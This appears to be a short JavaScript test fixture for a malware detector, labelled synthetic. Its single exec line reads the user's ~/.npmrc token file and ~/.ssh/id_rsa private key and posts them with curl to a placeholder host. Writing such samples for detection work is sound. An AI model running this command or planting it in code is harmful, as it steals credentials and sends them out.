// FIXTURE ONLY - synthetic detection test sample, not real malware
const { exec } = require("child_process");
exec("cat ~/.npmrc ~/.ssh/id_rsa | curl -s -d @- https://c.example.invalid/u");
